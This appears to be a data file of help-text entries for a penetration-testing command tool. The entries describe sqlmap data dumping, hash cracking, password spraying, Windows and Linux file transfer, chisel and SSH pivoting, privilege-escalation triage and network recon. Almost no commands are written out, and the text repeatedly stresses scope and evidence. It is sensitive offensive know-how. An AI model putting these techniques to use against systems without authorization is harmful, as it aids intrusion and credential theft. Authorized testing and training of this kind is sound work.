Use when: you care about terminal behavior and reliability.

entries.title: Dump Focused Columns Only
entries.description: Pull only the columns that matter to the finding so your evidence stays tight and your notes stay readable.
entries.tip: Column-level scoping is the quickest way to stay disciplined.
entries.help_menu:
Why: targeted dumping gives you proof without turning the run into a fishing expedition.
Limit to: the few columns that prove impact.

entries.title: Enumerate Databases and Tables
entries.description: Use a captured request to ask only for the structures you need once a finding is already confirmed.
entries.tip: Enumerate carefully and stop as soon as you have the evidence you need.
entries.help_menu:
Why: structured enumeration beats blind dumping.
Limit the run to: the confirmed database, target tables, and the minimum evidence set.

entries.title: Replay a Captured Request
entries.description: Feed sqlmap a raw request so it inherits the exact headers, cookies, body, and endpoint shape from your proxy.
entries.tip: This is usually the cleanest path for authenticated requests, JSON bodies, and unusual routing.
entries.help_menu:
Why: raw requests preserve the real application context.
Use for: authenticated areas, custom headers, JSON, multipart, and odd CSRF handling.

entries.title: Test a Single Parameter Quickly
entries.description: Start with one suspect parameter and keep the risk and level moderate until you understand how the target behaves.
entries.tip: Small scope first. You can widen the run once you know the traffic pattern is safe and relevant.
entries.help_menu:
Why: sqlmap is strongest when you already know where to point it.
Tune: level, risk, cookies, headers, and the target parameter list.

entries.title: Build a Wordlist from the Target Site
entries.description: Generate a target-flavored wordlist from site content when generic lists are missing the language the organization actually uses.
entries.tip: Company language, branding, and acronyms often outperform generic wordlists in a controlled test.
entries.help_menu:
Why: real org vocabulary often leaks into passwords.
Use to build a small, explainable wordlist before wider cracking or spraying.

entries.title: Apply Rules to NTLM Hashes
entries.description: Start with a focused NTLM wordlist run and a small ruleset before you burn time on larger hybrid or mask attacks.
entries.tip: Capture the hash source, exact mode, and ruleset so cracked credentials stay attributable later.
entries.help_menu:
Why: rules often outperform a raw larger list when the password policy is human-shaped.
Use after: validating the hash format and removing duplicates.

entries.title: Crack AS-REP Roast Hashes
entries.description: Use the dedicated AS-REP mode so Kerberos roast material is cracked with the right parser instead of a guessed generic mode.
entries.tip: Treat roast output as evidence too: note which user, collection path, and controller produced it.
entries.help_menu:
Why: Kerberos roast formats need the right mode or you waste time on false starts.
Pair with: username attribution and careful notes on which accounts matter most.

entries.title: Crack Kerberoast TGS Hashes
entries.description: Run the Kerberoast-specific mode against captured TGS material so service-account cracking stays targeted and reviewable.
entries.tip: Prioritize service accounts that actually change your path, not every crackable artifact.
entries.help_menu:
Why: TGS roast material maps to service accounts and application boundaries, not just generic passwords.
Use with: SPN context and a shortlist of accounts worth prioritizing.

entries.title: Review Cracked Hashes Without Re-running
entries.description: Use the potfile view path to report what is already cracked without rerunning the attack itself.
entries.tip: This is the clean reporting step after cracking, not the start of the workflow.
entries.help_menu:
Why: cracked credentials are only useful if you can map them back to the source hash set cleanly.
Use before: exporting or sharing results with the rest of the team.

entries.title: Run a Focused Hashcat Job
entries.description: Use hashcat with a known mode when you want controlled, high-speed offline cracking against a scoped hash set.
entries.tip: The right mode and a realistic candidate set beat random GPU time every day.
entries.help_menu:
Why: hashcat is powerful when the mode and candidates actually fit the target.
Verify the hash type before you launch a long run.

entries.title: Try a Policy-Shaped Mask Attack
entries.description: Use a mask only after you have a believable policy or pattern so the keyspace stays explainable instead of random brute force.
entries.tip: Masks are strongest when they reflect a real naming or password pattern you can defend in notes.
entries.help_menu:
Why: a targeted mask can collapse years of brute force into something practical.
Build it from policy clues, naming standards, or previously cracked samples.

entries.title: Password Spray a Service Carefully
entries.description: Use a single password across a user list when the workflow calls for a restrained online spray instead of deep guessing.
entries.tip: Single-password sprays are easier to reason about and safer around lockout thresholds than full brute forcing.
entries.help_menu:
Why: online auth work should stay measured and auditable.
Check: lockout policy, timing, and the exact service behavior first.

entries.title: Crack a Hash with a Wordlist
entries.description: Feed a captured hash into John with a targeted wordlist when offline cracking fits the evidence you already collected.
entries.tip: Know the hash format first. Correct format handling matters more than a giant wordlist.
entries.help_menu:
Why: offline cracking should start with the right mode and a realistic wordlist.
Record: source, format, and any rules or masks you apply.

entries.title: Fetch a File from Windows CMD
entries.description: Use certutil from a CMD context when you need a built-in HTTP fetch path on Windows.
entries.tip: This is one of the most reliable built-in options when PowerShell is restricted or logged differently.
entries.help_menu:
Why: built-in transfer options matter on locked-down hosts.
Use when: CMD is easier to reach than PowerShell.

entries.title: Pull a File with curl
entries.description: Use curl to fetch a file directly when an HTTP server is already available and you want failure handling plus a predictable output name.
entries.tip: Use -f so HTTP errors fail clearly, -L when redirects are expected, and verify size or checksum for important files.
entries.help_menu:
Why: curl is widely available and predictable.
Use for: scripts, archives, notes, or tooling fetched over HTTP. Add chmod only after you verify the file landed correctly.

entries.title: Expose a Quick SMB Share
entries.description: Stand up an SMB share from your current directory when Windows-native copy paths are easier than HTTP on the target side.
entries.tip: Very handy when you want to avoid web downloads entirely and the target can reach SMB back to you.
entries.help_menu:
Why: SMB often feels native on Windows targets.
Use for: binaries, scripts, and staging files when outbound SMB is allowed.

entries.title: Fetch a File from PowerShell
entries.description: Pull a file over HTTP with PowerShell when you need a native Windows transfer path and object-friendly syntax.
entries.tip: PowerShell often gives cleaner error handling and scripting options than CMD-based transfer paths.
entries.help_menu:
Why: PowerShell is convenient for native downloads and follow-on automation.
Use for: scripts, binaries, and quick one-off transfers.

entries.title: Serve Files from Linux
entries.description: Start a quick HTTP server from the current directory so you can move tools or notes onto another host.
entries.tip: Serving the current directory is fast, but be careful what else is sitting next to the file you actually need.
entries.help_menu:
Why: HTTP is often the easiest transfer path to stand up on short notice.
Keep the share directory clean and obvious.

entries.title: List SUID Files
entries.description: Review SUID binaries again through a privilege-escalation lens so unusual or app-specific files stand out.
entries.tip: The interesting part is rarely the standard system list. It is the odd binary nobody expected to be there.
entries.help_menu:
Why: SUID files define local trust boundaries.
Look for: third-party binaries, uncommon paths, and app-owned tooling.

entries.title: Review File Capabilities
entries.description: Check Linux file capabilities so you do not miss privileged execution paths that are invisible to a SUID-only review.
entries.tip: Capabilities often surface quieter trust edges than SUID binaries do.
entries.help_menu:
Why: capabilities can grant narrow but important privileged actions.
Use alongside: sudo, SUID, PATH, and service reviews.

entries.title: Run LinPEAS for Triage
entries.description: Use LinPEAS as a broad second-pass enumerator after the manual basics are already captured.
entries.tip: Manual context first, noisy script second. That order makes the output much easier to interpret.
entries.help_menu:
Why: LinPEAS is great at surfacing lots of local context quickly.
Use after: identity, sudo, services, SUID, and capabilities are already noted.

entries.title: Check What Sudo Allows
entries.description: Review the current user context and any allowed commands before you do anything more complicated on the host.
entries.tip: This is a foundational privesc triage step and worth capturing early in your notes.
entries.help_menu:
Why: sudo rights can define the whole local path.
Look for: NOPASSWD entries, command wildcards, and allowed interpreters or editors.

entries.title: Connect a Client Back and Publish SOCKS
entries.description: Attach a chisel client back to your server and expose a SOCKS path you can feed into proxy-aware tooling.
entries.tip: Keep the proxy path simple and label it clearly in your notes so later scans use the route you expect.
entries.help_menu:
Why: published SOCKS routes make reuse easier across multiple tools.
Validate the tunnel with a small command before any larger scan.

entries.title: Expose a Reverse Tunnel Server
entries.description: Start a chisel server in reverse mode when the target can call back to you but you still need a routable pivot path.
entries.tip: Reverse tunnels are useful when inbound access to the target is easy but returning from it is the real challenge.
entries.help_menu:
Why: reverse-capable tooling helps when the target can reach you more easily than you can reach it.
Keep notes on every published route.

entries.title: Route Tooling Through SOCKS
entries.description: Send a proxy-aware tool through a SOCKS tunnel when you need to validate internal reachability from your own host.
entries.tip: Verify the tunnel path with a very small test first so you do not mistake routing issues for service behavior.
entries.help_menu:
Why: pivoting only works if the tool really uses the proxy path.
Check your proxychains config and confirm the route on a small target first.

entries.title: Dynamic SOCKS Proxy
entries.description: Use SSH dynamic forwarding when you need a general proxy path for browsers or tools that speak SOCKS cleanly.
entries.tip: SOCKS is flexible, but only if the tools you care about are configured to actually use it.
entries.help_menu:
Why: a SOCKS tunnel is a flexible middle ground between one port and a bigger pivot.
Pair with: browser proxy settings or proxychains-aware CLI tools.

entries.title: Local Port Forward to an Internal Service
entries.description: Forward one local port into a specific internal service when you only need a narrow, explicit route.
entries.tip: Single-service forwards are easier to track and less error-prone than a broad tunnel when you do not need one.
entries.help_menu:
Why: explicit routing keeps tunnel scope readable.
Use when: one admin panel, database, or web service is the next step.

entries.title: Check Writable Services and Objects
entries.description: Use AccessChk to review which services or objects low-privileged users can modify before you chase a local path further.
entries.tip: This is a great follow-up when a service path or startup item already looks suspicious.
entries.help_menu:
Why: effective privilege escalation work depends on accurate permissions data.
Use to validate whether a service or object is actually writable in practice.

entries.title: Enumerate Common Windows Escalation Paths
entries.description: Use PowerUp when you want a PowerShell-oriented view of service, registry, and path-based privilege boundaries.
entries.tip: PowerUp is most useful when you can already interpret the service and file paths it reports.
entries.help_menu:
Why: PowerUp surfaces common Windows trust issues in a familiar PowerShell workflow.
Use to review service paths, permissions, and startup-related checks.

entries.title: Review Privileges Again from CMD
entries.description: Look at the token privileges directly when you shift from general host triage into Windows privesc thinking.
entries.tip: Privilege names matter. Capture them cleanly before you start chasing service paths or scheduled tasks.
entries.help_menu:
Why: the current token can enable or rule out several local paths immediately.
Look for: impersonation, assign-primary-token, and backup-like rights.

entries.title: Run winPEAS for Triage
entries.description: Use winPEAS as a broad Windows second pass after you already understand the host, user, and service context.
entries.tip: The manual basics make winPEAS output far easier to separate into signal and noise.
entries.help_menu:
Why: winPEAS helps widen the review once you already have context.
Use after: identity, services, scheduled tasks, shares, and listening ports are recorded.

entries.title: Inspect Client-Side State
entries.description: Review cookies, local storage, session storage, and service worker state so you know what the app trusts on the client side.
entries.command: Open DevTools -> Application -> review cookies, local storage, session storage, and service workers
entries.tip: Client-side state often exposes roles, feature flags, JWTs, and forgotten environment hints.
entries.help_menu:
Why: auth and app state frequently leak here.
Look for: JWTs, API tokens, roles, debug flags, and stale app data.

entries.title: Map the Request Flow in the Browser
entries.description: Use the Network tab to trace how the page loads, which endpoints it calls, and how the app handles redirects, XHR, and fetch traffic.
entries.command: Open DevTools -> Network -> Preserve log -> Reload -> trace HTML, JS, XHR, fetch, and static assets
entries.tip: This is usually the fastest way to spot hidden APIs, auth redirects, and client-side routes before you proxy anything.
entries.help_menu:
Why: the browser shows you the app the way users actually hit it.
Look for: hidden API calls, preloaded JSON, third-party services, and auth redirects.

entries.title: Fingerprint the Stack Before You Dive In
entries.description: Use browser-side fingerprinting to identify frameworks, CDNs, analytics, and common application families quickly.
entries.command: Use Wappalyzer or built-in response headers to fingerprint frameworks, CDNs, analytics, and auth products
entries.tip: Once you know the stack, switch to the tooling and wordlists that actually fit it.
entries.help_menu:
Why: framework clues narrow your testing path fast.
Look for: CMS signatures, front-end frameworks, WAFs, SSO products, and cloud hints.

entries.title: Passive Asset Discovery with Amass
entries.description: Run a passive Amass pass when you want another strong source-backed view of the attack surface from OSINT and internet data.
entries.tip: Good complement to Subfinder when you want a second data source and richer discovery context.
entries.help_menu:
Why: Amass remains strong for asset discovery and attack surface mapping.
Use when: you want a richer passive discovery pass before active validation.

entries.title: Check for a Zone Transfer
entries.description: Test whether an authoritative name server will hand over the zone. Rare now, but still worth a quick authorized check.
entries.tip: If it fails, move on quickly. If it works, document carefully because the finding is high-value.
entries.help_menu:
Why: a successful AXFR can reveal a huge amount of internal naming and service exposure.
Use only against in-scope authoritative servers.

entries.title: Resolve Core DNS Records Quickly
entries.description: Pull simple address records without extra formatting noise. A fast way to validate whether a name resolves and to what.
entries.tip: Keep this as your baseline before subdomain brute force or web probing.
entries.help_menu:
Why: `+short` keeps the output script-friendly and easy to read.
Use when: you want a clean answer for basic A and AAAA resolution.

entries.title: Brute Force Subdomains with a Wordlist
entries.description: Run focused wordlist-based DNS brute force after passive enumeration so you can check for obvious hidden names without going blind.
entries.tip: Wordlist quality matters more than raw size for quick wins.
entries.help_menu:
Why: active DNS brute force can fill in gaps left by passive sources.
Use after: passive discovery, not before, unless you have a good reason.

entries.title: Resolve and Validate Subdomains
entries.description: Take passive results and confirm which names actually resolve. Great for cutting noise before HTTP probing.
entries.tip: This is one of the fastest ways to turn a noisy subdomain list into something useful.
entries.help_menu:
Why: dnsx helps validate which discovered names resolve.
Use when: you want a cleaner list before httpx or manual review.

entries.title: Passive Subdomain Enumeration
entries.description: Use passive sources to build a subdomain list before brute force or active HTTP probing. Low-friction and still high-value.
entries.tip: Passive first keeps the workflow cleaner and reduces unnecessary noise.
entries.help_menu:
Why: passive enumeration is often the right first move for web surface mapping.
Use when: you want broad discovery without active DNS brute force yet.

entries.title: Fast Top 1000 Port Check
entries.description: Use Naabu for quick port discovery with lightweight output before chaining deeper analysis into Nmap or HTTP tooling.
entries.tip: Tune the rate to match scope and environment instead of blasting defaults at everything.
entries.help_menu:
Why: Naabu is handy for quick port discovery workflows.
Use when: you want fast port output you can chain into other tools.

entries.title: Feed Naabu Results Straight into Nmap
entries.description: Chain quick port discovery into service detection so you can move from reachability to useful fingerprints in one command path.
entries.tip: This is a practical modern workflow when you want speed first and richer fingerprints second.
entries.help_menu:
Why: keeps the discovery-to-validation loop tight.
Use when: you want a compact workflow instead of running separate manual steps.

entries.title: Default Scripts and Version Detection
entries.description: Fast service overview for a known target with default scripts, version detection, and solid everyday coverage.
entries.tip: This is still one of the best all-around first scans for a single target.
entries.help_menu:
Why: `-sC` runs default NSE scripts and `-sV` grabs service versions.
Use when: you already know the host is live and want fast service context.

entries.title: Full TCP Port Scan with Saved Output
entries.description: Sweep all TCP ports and store results in every useful format so you can replay findings later without rescanning blindly.
entries.tip: If you only do one deeper TCP scan, make it one you can come back to.
entries.help_menu:
Why: `-p-` covers the full TCP space and `-oA` saves normal, grepable, and XML output.
Use when: targeted top-port scans are not enough and scope allows a deeper pass.

entries.title: Ping Sweep a CIDR
entries.description: Map live hosts across a subnet without doing a port scan. A clean, low-noise first move on a new range.
entries.tip: Keep the sweep results. They become the input for everything else.
entries.help_menu:
Why: `-sn` performs host discovery only.
Use when: you want live systems before deeper scans, especially on larger ranges.

entries.title: Top 100 UDP Ports
entries.description: Quick UDP coverage for the ports most likely to matter first, without committing to a full UDP marathon.
entries.tip: UDP gets skipped too often. Even a shortlist can surface DNS, SNMP, or TFTP quickly.
entries.help_menu:
Why: UDP scans are slower, so a top-port sweep is often the practical starting point.
Look for: DNS, SNMP, NTP, TFTP, and custom UDP apps.

entries.title: One-Stop SMB and RPC Enumeration
entries.description: Run enum4linux-ng for broad Windows and Samba enumeration in a single tool pass, especially on older or mixed environments.
entries.tip: A strong all-in-one check when you want broad context fast.
entries.help_menu:
Why: enum4linux-ng wraps several useful enumeration checks into one workflow.
Use when: you want broad SMB and RPC context before narrowing focus.

entries.title: Check Anonymous FTP Carefully
entries.description: Use the native client to test whether a target exposes anonymous access or obvious shared content.
entries.tip: Native clients are often the cleanest first proof that a service really is reachable and interactive.
entries.help_menu:
Why: protocol-native checks establish the baseline fastest.
Look for: anonymous access, readable directories, and interesting filenames.

entries.title: Pull LDAP Naming Contexts
entries.description: Ask the LDAP server for naming contexts first so you know which base DNs are worth querying next.
entries.tip: This is the cleanest way to orient yourself before deeper LDAP queries.
entries.help_menu:
Why: naming contexts tell you where useful LDAP data lives.
Use when: you need the right base DN before user, group, or computer queries.

entries.title: Query LDAP for Person Objects
entries.description: Search a known base DN for person objects and return useful identity fields without pulling every attribute blindly.
entries.tip: Start narrow with the attributes you actually need.
entries.help_menu:
Why: targeted LDAP queries stay readable and reduce noise.
Use when: you already know the base DN and want user-oriented context from the directory.

entries.title: Try a Targeted MySQL Connection
entries.description: Use the native client when you have credentials or a strong hint that a service account is valid for the target instance.
entries.tip: The native client will usually tell you more than generic port scans once credentials exist.
entries.help_menu:
Why: protocol-native tooling gives you version and auth feedback fast.
Use after: validating the port and obtaining scoped credentials.

entries.title: Check SMB Signing and Mode
entries.description: Use an Nmap NSE script to review SMB security mode and whether signing is enabled or required.
entries.tip: A focused NSE script can answer one important question faster than a bigger scan.
entries.help_menu:
Why: SMB signing state is useful environment context during Windows network assessments.
Use when: port 445 is open and you want a fast protocol posture check.

entries.title: Inspect a Redis Service
entries.description: Connect with redis-cli and review basic server information when Redis appears open or reachable internally.
entries.tip: INFO alone can reveal versioning, auth behavior, persistence, and environment clues.
entries.help_menu:
Why: Redis often leaks useful context before you do anything else.
Look for: version, persistence settings, ACL hints, and bound interfaces.

entries.title: List NFS Exports
entries.description: Check which NFS exports a host is publishing. Still a solid move in Unix-heavy or legacy internal environments.
entries.tip: NFS often surfaces quietly in mixed Linux estates and backup zones.
entries.help_menu:
Why: exported NFS paths can reveal shared data, backups, and operational directories.
Use when: port 2049 or rpcbind-related services suggest NFS is in play.

entries.title: List SMB Shares with a Null Session
entries.description: Check whether a target will reveal SMB shares anonymously. A quick first step before deeper share review.
entries.tip: If the spacing feels awkward, remember the target path is still SMB syntax under the hood.
entries.help_menu:
Why: null-session checks are still worth testing on in-scope Windows and Samba targets.
If needed: try `smbclient -N -L //<TARGET>` if your shell format prefers it that way.

entries.title: Quick SMB Share Overview
entries.description: Use SMBMap to enumerate accessible SMB shares and permissions in a compact, operator-friendly format.
entries.tip: Very handy when you want faster share readability than raw smbclient output.
entries.help_menu:
Why: SMBMap makes share enumeration and access review easy to scan.
Use when: you want readable share visibility and access hints quickly.

entries.title: Walk the SNMP System Tree
entries.description: Query the standard system branch first when you suspect SNMP is enabled and a default or known community string is in scope.
entries.tip: Start with the system branch before you walk bigger parts of the tree.
entries.help_menu:
Why: the system OID branch is a safe first place to confirm useful SNMP access.
Look for: hostnames, descriptions, contact data, and location fields.

entries.title: Validate RDP Access with NLA
entries.description: Use FreeRDP for a clean RDP check when the environment suggests a real desktop or server session may be available.
entries.tip: RDP access is usually worth validating explicitly because it changes the rest of the workflow immediately.
entries.help_menu:
Why: an interactive desktop path can change both enumeration and evidence collection.
Use with scoped creds and note NLA, cert, and desktop behavior.

entries.title: Probe a Host List at Scale
entries.description: Feed a file of hosts into httpx and enrich the live web surface with titles, tech hints, and status codes.
entries.tip: Excellent right after subdomain validation or port discovery.
entries.help_menu:
Why: turns a host list into something you can prioritize quickly.
Use when: you want the live web surface sorted before screenshots, crawling, or nuclei.

entries.title: Single URL Probe with Useful Fields
entries.description: Probe one URL and enrich it with title, status code, server banner, tech fingerprints, and resolved IP information.
entries.tip: This is a great everyday probe when you want more than curl but less than a full crawler.
entries.help_menu:
Why: httpx is excellent for quick HTTP enrichment at scale.
Use when: you want titles, status codes, tech guesses, and IPs in one clean pass.

entries.title: Take Screenshots of Live Web Targets
entries.description: Capture screenshots at scale to spot admin panels, default pages, and interesting branding without loading every host manually.
entries.tip: Screenshots are underrated for prioritization, especially during bigger external recon passes.
entries.help_menu:
Why: visual triage can surface priority targets fast.
Use when: you have many web hosts and need to spot login panels or unusual apps quickly.

entries.title: Capture Screenshots from a URL List
entries.description: Use EyeWitness when you want a screenshot-heavy report with server clues and a quick visual triage pass.
entries.tip: Best after httpx or another validator gives you a clean list of live web URLs.
entries.help_menu:
Why: a visual report makes large web surfaces much easier to prioritize.
Use when: you need screenshots, titles, and server hints for many URLs.

entries.title: Import Nmap XML into EyeWitness
entries.description: Feed Nmap XML into EyeWitness so service discovery can turn directly into screenshot review.
entries.tip: Useful when the web targets came from port scanning instead of a URL list.
entries.help_menu:
Why: Nmap XML import keeps service discovery and visual triage connected.
Use when: your scan found HTTP services across unusual ports.

entries.title: Build an Aquatone Visual Report
entries.description: Pipe a live URL or host list into Aquatone to generate a screenshot report for quick web surface review.
entries.tip: Aquatone is archived, so keep it as a compatibility option and prefer maintained screenshot tooling for new pipelines.
entries.help_menu:
Why: Aquatone clusters screenshots into a compact HTML report.
Use when: you specifically want Aquatone-style output or are replaying an older recon workflow.

entries.title: Import Nmap XML into Aquatone
entries.description: Use Aquatone's Nmap parser when your web targets came from a port scan and you want screenshot output.
entries.tip: Set a dedicated output directory so screenshots, headers, HTML, and reports stay together.
entries.help_menu:
Why: Nmap XML import lets a service scan become a visual review queue.
Use when: you have many HTTP-like services across mixed ports.

entries.title: Crawl a Site for Links and Paths
entries.description: Use Katana to spider a target web application and collect paths, parameters, and linked resources from live content.
entries.tip: Katana is especially helpful when static wordlists miss JS-driven navigation and linked paths.
entries.help_menu:
Why: live crawling complements wordlist fuzzing and archive mining.
Use when: you want discovered paths from the application itself, not just guesses from wordlists.

entries.title: Inspect the TLS Certificate
entries.description: Pull issuer, subject, and validity dates from a TLS certificate without opening a browser. Great for finding SAN clues and expirations.
entries.tip: Certificates often expose extra hostnames even when the main site is sparse.
entries.help_menu:
Why: certificate metadata can reveal branding, hostnames, and validation windows.
Look for: wildcard names, old certs, and subjects that do not match the public app.

entries.title: Pull Historical URLs from Archives
entries.description: Mine archive data for old endpoints, forgotten paths, and retired application routes that still deserve a look.
entries.tip: Historical URLs are gold for parameter discovery and content fuzzing prep.
entries.help_menu:
Why: old URLs often surface legacy app routes, backups, and forgotten functionality.
Use when: you are building a better endpoint list before manual review or ffuf.

entries.title: Fingerprint Technologies with WhatWeb
entries.description: Identify frameworks, servers, plugins, CMS fingerprints, and platform clues using a purpose-built web fingerprinting tool.
entries.tip: A nice second opinion when server headers and titles are not telling the full story.
entries.help_menu:
Why: WhatWeb is built for application fingerprinting.
Use when: you need a stronger guess at framework, CMS, or plugin stack.

entries.title: Enumerate WordPress Surface
entries.description: Run WPScan against a WordPress target to identify plugins, themes, and users from the application footprint.
entries.tip: Only reach for this when you already know the target is WordPress.
entries.help_menu:
Why: WPScan is purpose-built for WordPress enumeration.
Use when: fingerprinting already tells you the target is WordPress and you want focused coverage.

entries.title: Check Headers Fast
entries.description: Grab response headers quickly to identify status code, server hints, security headers, and redirect behavior.
entries.tip: This stays useful even when you later switch to a browser or proxy.
entries.help_menu:
Why: header-only requests give you a low-noise first look at a web target.
Look for: redirects, HSTS, cookies, server headers, cache behavior, and missing security headers.

entries.title: Inspect a Full Response Sample
entries.description: Fetch a page with headers and body so you can see redirects, cookies, and the first chunk of actual content without opening a browser.
entries.tip: Great when you want a quick human-readable preview before deeper probing.
entries.help_menu:
Why: pairs headers with body content so you can quickly fingerprint login pages and app behavior.
Use when: you want to preview the response in terminal first.

entries.title: Replay a POST with URL-Encoded Data
entries.description: Send a classic form POST with explicit content type and body so you can replay login or search actions by hand.
entries.tip: Add cookies, CSRF tokens, and headers only after you have the simplest working request first.
entries.help_menu:
Why: form posts are still everywhere.
Use for: auth forms, search boxes, password reset forms, and manual response diffing.

entries.title: Measure Status, Size, and Timing
entries.description: Reduce a request to stable numbers so you can compare redirects, filters, payloads, and auth states without reading the whole body every time.
entries.tip: Use this before and after a payload change when body diffs are too noisy.
entries.help_menu:
Why: status, size, and timing make manual comparisons much cleaner.
Use for: auth differences, WAF behavior, cache checks, redirect mapping, and blind validation.

entries.title: Save Headers and Body Separately
entries.description: Capture response headers and body into separate files so you can diff them, attach evidence, or inspect large responses without cluttering the terminal.
entries.tip: Pair this with diff or git when you need clean before-and-after evidence.
entries.help_menu:
Why: separating headers and body keeps evidence readable.
Use when: tracking cookie changes, redirect behavior, caching, or response-body changes across tests.

entries.title: Pin a Hostname to an IP
entries.description: Use curl DNS pinning when you need the correct Host/SNI name but want traffic to hit a specific IP address.
entries.tip: This is cleaner than editing /etc/hosts for one-off virtual-host checks.
entries.help_menu:
Why: virtual hosts often require the hostname even when you are testing a raw IP.
Use for: vhost validation, staging hosts, CDN bypass checks in scope, and local routing experiments.

entries.title: Persist Cookies Across Requests
entries.description: Write cookies from one response and reuse them in the next request so login, redirect, or CSRF workflows stay reproducible in the terminal.
entries.tip: Use a fresh cookie jar per test case so state does not bleed between comparisons.
entries.help_menu:
Why: cookie jars keep manual replay stateful without hiding what is happening.
Use for: login flows, redirects, session fixation checks, and comparing anonymous vs authenticated behavior.

entries.title: Replay an Authenticated JSON API Request
entries.description: Send an authenticated JSON API request with explicit headers so auth, content negotiation, and response metadata are all visible.
entries.tip: Keep the first API replay read-only, then compare IDs, roles, or tenant values one at a time.
entries.help_menu:
Why: direct API replay is ideal for clean authorization comparisons.
Use for: IDOR checks, role comparisons, bearer-token behavior, and quick response diffing.

entries.title: Craft a JSON POST Quickly
